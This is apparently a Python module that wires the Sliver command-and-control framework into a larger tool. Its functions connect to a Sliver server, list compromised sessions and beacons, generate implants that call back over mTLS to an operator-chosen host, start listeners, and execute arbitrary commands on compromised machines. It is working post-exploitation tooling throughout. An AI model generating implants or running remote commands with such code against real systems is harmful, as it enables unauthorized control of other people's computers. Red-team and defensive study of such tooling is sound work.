"""Sliver C2 Integration Module - Connects to Sliver server for post-exploitation"""
import logging
import os
import asyncio
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

_sliver_client = None
_sliver_connected = False
_sliver_last_error = ""
_sliver_retry_count = 0
_sliver_reconnect_task = None


def _validate_config_path(config_path: str) -> tuple:
    """Validate Sliver config path. Returns (resolved_path, error_string)"""
    if not config_path:
        return None, "SLIVER_CONFIG_PATH not set in .env"

    path = os.path.expanduser(config_path)

    # If it's a directory, look for common config file names inside
    if os.path.isdir(path):
        candidates = ["default.cfg", "operator.cfg", "sliver-client.cfg"]
        for candidate in candidates:
            candidate_path = os.path.join(path, candidate)
            if os.path.isfile(candidate_path):
                logger.info(f"Sliver config resolved: {path} -> {candidate_path}")
                return candidate_path, None
        # Also check configs/ subdirectory
        configs_dir = os.path.join(path, "configs")
        if os.path.isdir(configs_dir):
            for candidate in candidates:
                candidate_path = os.path.join(configs_dir, candidate)
                if os.path.isfile(candidate_path):
                    logger.info(f"Sliver config resolved: {path} -> {candidate_path}")
                    return candidate_path, None
        # List what's actually in the directory for debugging
        try:
            contents = os.listdir(path)
            cfg_files = [f for f in contents if f.endswith('.cfg') or f.endswith('.json')]
        except Exception:
            cfg_files = []
        return None, f"SLIVER_CONFIG_PATH is a directory ({path}), not a config file. Found: {cfg_files or 'no .cfg files'}. Expected: path to operator config file (e.g., /home/USER/.sliver-client/configs/default.cfg)"

    if not os.path.isfile(path):
        return None, f"Sliver config file not found: {path}"

    if not os.access(path, os.R_OK):
        return None, f"Sliver config file not readable (permission denied): {path}"

    return path, None


async def connect_sliver(config_path: str) -> bool:
    """Connect to Sliver C2 server using operator config"""
    global _sliver_client, _sliver_connected, _sliver_last_error

    resolved_path, error = _validate_config_path(config_path)
    if error:
        _sliver_last_error = error
        logger.warning(f"Sliver config validation: {error}")
        return False

    try:
        from sliver import SliverClientConfig, SliverClient
        config = SliverClientConfig.parse_config_file(resolved_path)
        _sliver_client = SliverClient(config)
        await _sliver_client.connect()
        _sliver_connected = True
        _sliver_last_error = ""
        logger.info(f"Connected to Sliver C2 server via {resolved_path}")
        return True
    except ImportError:
        _sliver_last_error = "sliver-py not installed. Run: pip install sliver-py"
        logger.warning(_sliver_last_error)
        return False
    except Exception as e:
        _sliver_last_error = str(e)
        _sliver_connected = False
        logger.warning(f"Sliver connection failed: {e}")
        return False


def is_connected() -> bool:
    return _sliver_connected and _sliver_client is not None


async def _ensure_connected(config_path: str) -> bool:
    """Ensure Sliver is connected, attempt reconnect if not"""
    global _sliver_connected, _sliver_client

    if _sliver_connected and _sliver_client:
        # Validate connection is still alive
        try:
            await _sliver_client.version()
            return True
        except Exception:
            logger.warning("Sliver connection lost, reconnecting...")
            _sliver_connected = False
            _sliver_client = None

    return await connect_sliver(config_path)


async def start_reconnect_loop(config_path: str):
    """Background reconnection with exponential backoff"""
    global _sliver_reconnect_task, _sliver_retry_count
    if _sliver_reconnect_task and not _sliver_reconnect_task.done():
        return  # Already running

    async def _reconnect():
        global _sliver_retry_count
        base_delay = 5
        max_delay = 120
        max_retries = 15

        while _sliver_retry_count < max_retries and not _sliver_connected:
            _sliver_retry_count += 1
            delay = min(base_delay * (2 ** (_sliver_retry_count - 1)), max_delay)
            logger.info(f"Sliver reconnect attempt {_sliver_retry_count} in {delay}s...")
            await asyncio.sleep(delay)

            if _sliver_connected:
                break

            success = await connect_sliver(config_path)
            if success:
                _sliver_retry_count = 0
                logger.info("Sliver reconnected successfully!")
                break

    _sliver_reconnect_task = asyncio.create_task(_reconnect())


async def get_status(config_path: str) -> Dict:
    """Get Sliver connection status with diagnostics"""
    resolved_path, validation_error = _validate_config_path(config_path)

    if validation_error:
        return {
            "connected": False,
            "error": validation_error,
            "hint": "Set SLIVER_CONFIG_PATH to the operator config file (not directory). Example: /home/USER/.sliver-client/configs/default.cfg",
            "diagnostics": {
                "config_path_raw": config_path,
                "resolved": None,
                "validation_error": validation_error
            }
        }

    if not _sliver_connected:
        connected = await connect_sliver(config_path)
        if not connected:
            return {
                "connected": False,
                "error": _sliver_last_error or "Cannot connect to Sliver server",
                "hint": "Ensure sliver-server is running and the config file is valid",
                "diagnostics": {
                    "config_path_raw": config_path,
                    "resolved": resolved_path,
                    "last_error": _sliver_last_error,
                    "retry_count": _sliver_retry_count
                }
            }
    try:
        version = await _sliver_client.version()
        return {
            "connected": True,
            "version": f"{version.Major}.{version.Minor}.{version.Patch}",
            "config_path": resolved_path,
            "diagnostics": {
                "config_path_raw": config_path,
                "resolved": resolved_path,
            }
        }
    except Exception as e:
        return {"connected": False, "error": str(e)}


async def list_sessions(config_path: str) -> List[Dict]:
    """List active Sliver sessions"""
    if not await _ensure_connected(config_path):
        return []
    try:
        sessions = await _sliver_client.sessions()
        return [{
            "id": s.ID,
            "name": s.Name,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "remote_address": s.RemoteAddress,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
            "reconnect_interval": s.ReconnectInterval,
            "type": "session"
        } for s in sessions]
    except Exception as e:
        logger.error(f"Sliver session list error: {e}")
        return []


async def list_beacons(config_path: str) -> List[Dict]:
    """List active Sliver beacons"""
    if not await _ensure_connected(config_path):
        return []
    try:
        beacons = await _sliver_client.beacons()
        return [{
            "id": b.ID,
            "name": b.Name,
            "hostname": b.Hostname,
            "username": b.Username,
            "os": b.OS,
            "arch": b.Arch,
            "transport": b.Transport,
            "remote_address": b.RemoteAddress,
            "pid": b.PID,
            "interval": b.Interval,
            "jitter": b.Jitter,
            "next_checkin": b.NextCheckin,
            "type": "beacon"
        } for b in beacons]
    except Exception as e:
        logger.error(f"Sliver beacon list error: {e}")
        return []


async def list_implants(config_path: str) -> List[Dict]:
    """List generated Sliver implants"""
    if not await _ensure_connected(config_path):
        return []
    try:
        implants = await _sliver_client.implant_builds()
        return [{
            "name": name,
            "os": build.GOOS,
            "arch": build.GOARCH,
            "format": build.Format,
            "c2": [f"{c.URL}" for c in build.C2],
            "type": "session" if not build.IsBeacon else "beacon"
        } for name, build in implants.items()]
    except Exception as e:
        logger.error(f"Sliver implant list error: {e}")
        return []


async def generate_implant(config_path: str, name: str, lhost: str, lport: int = 443, os_target: str = "linux", arch: str = "amd64", implant_type: str = "session", format_type: str = "executable") -> Dict:
    """Generate a Sliver implant/beacon"""
    if not await _ensure_connected(config_path):
        return {"error": f"Not connected to Sliver. {_sliver_last_error}"}
    try:
        from sliver.pb.clientpb import client_pb2
        if implant_type == "beacon":
            config = client_pb2.ImplantConfig(
                IsBeacon=True,
                Name=name,
                GOOS=os_target,
                GOARCH=arch,
                C2=[client_pb2.ImplantC2(URL=f"mtls://{lhost}:{lport}", Priority=0)],
                BeaconInterval=60,
                BeaconJitter=30,
            )
        else:
            config = client_pb2.ImplantConfig(
                IsBeacon=False,
                Name=name,
                GOOS=os_target,
                GOARCH=arch,
                C2=[client_pb2.ImplantC2(URL=f"mtls://{lhost}:{lport}", Priority=0)],
            )

        generated = await _sliver_client.generate_implant(config)
        return {
            "success": True,
            "name": name,
            "os": os_target,
            "arch": arch,
            "type": implant_type,
            "c2_url": f"mtls://{lhost}:{lport}",
            "size": len(generated.File.Data) if generated.File else 0,
            "file_name": generated.File.Name if generated.File else name
        }
    except Exception as e:
        return {"error": str(e)}


async def session_exec(config_path: str, session_id: str, command: str) -> Dict:
    """Execute command on a Sliver session"""
    if not await _ensure_connected(config_path):
        return {"error": f"Not connected to Sliver. {_sliver_last_error}"}
    try:
        session = await _sliver_client.interact_session(session_id)
        parts = command.split()
        exe = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        result = await session.execute(exe, args)
        return {
            "session_id": session_id,
            "command": command,
            "stdout": result.Stdout.decode() if result.Stdout else "",
            "stderr": result.Stderr.decode() if result.Stderr else "",
            "status": result.Status,
            "success": True
        }
    except Exception as e:
        return {"error": str(e), "success": False}


async def start_listener(config_path: str, lhost: str, lport: int = 443, protocol: str = "mtls") -> Dict:
    """Start a Sliver listener"""
    if not await _ensure_connected(config_path):
        return {"error": f"Not connected to Sliver. {_sliver_last_error}"}
    try:
        if protocol == "mtls":
            job = await _sliver_client.start_mtls_listener(lhost, lport)
        elif protocol == "http":
            job = await _sliver_client.start_http_listener("", lhost, lport)
        elif protocol == "https":
            job = await _sliver_client.start_https_listener("", lhost, lport)
        elif protocol == "dns":
            job = await _sliver_client.start_dns_listener([lhost], False, False)
        else:
            return {"error": f"Unknown protocol: {protocol}"}

        return {
            "success": True,
            "job_id": job.JobID,
            "protocol": protocol,
            "host": lhost,
            "port": lport
        }
    except Exception as e:
        return {"error": str(e)}
